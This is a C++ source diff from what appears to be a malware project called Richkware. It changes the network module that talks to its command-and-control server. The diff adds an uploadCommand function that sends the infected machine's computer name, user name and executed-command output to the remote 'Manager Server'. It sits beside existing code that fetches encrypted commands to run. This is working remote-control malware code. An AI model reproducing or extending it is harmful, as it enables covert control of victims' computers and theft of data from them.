@@ -161,14 +161,13 @@ bool Network::UploadInfoToRMS(const char *serverAddress, const char *port, const
     return false;
 }
 
-std::string Network::fetchCommand(const char *serverAddress, const char *port, std::string remainingCommands) {
+std::string Network::fetchCommand(const char *serverAddress, const char *port) {
     Crypto crypto(encryptionKey);
     std::string device = getenv("COMPUTERNAME");
     device.append("/");
     device.append(getenv("USERNAME"));
 
     std::string packet = "GET /Richkware-Manager-Server/command?data0=" + device +
-                         "&data1=" + remainingCommands +
                          " HTTP/1.1\r\n" +
                          "Host: " + serverAddress + "\r\n" +
                          "Connection: close\r\n" +
@@ -207,14 +206,31 @@ std::string Network::fetchCommand(const char *serverAddress, const char *port, s
         //TODO: manage KO from server
         return "";
     }
+}
 
-//    std::vector<std::string> commands = utils::split(response, "##");
-//
-//    //save commands to file
-//    SystemStorage storage = SystemStorage(appName);
-//    for (size_t i = 0; i < commands.size(); ++i) {
-//        storage.SaveValueToFile("commands.richk")
-//    }
+bool Network::uploadCommand(std::string commandsOutput, const char *serverAddress, const char *port) {
+    Crypto crypto(encryptionKey);
+    std::string device = getenv("COMPUTERNAME");
+    device.append("/");
+    device.append(getenv("USERNAME"));
+
+    std::string packet = "POST /Richkware-Manager-Server/command?data0=" + device +
+                         "&data1=" + commandsOutput +
+                         " HTTP/1.1\r\n" +
+                         "Host: " + serverAddress + "\r\n" +
+                         "Connection: close\r\n" +
+                         "\r\n";
+
+    std::string response = RawRequest(serverAddress, port,
+                                      packet.c_str()); //response è un JSON che contiene i comandi criptati da eseguire
+    std::cout << response << std::endl;
+    //parse message from server
+    if (response.find("OK") != std::string::npos) {
+        return true;
+    } else {
+        //TODO: manage KO from server
+        return false;
+    }
 }
 
 std::string Network::GetEncryptionKeyFromRMS(const char *serverAddress, const char *port, const char *associatedUser) {
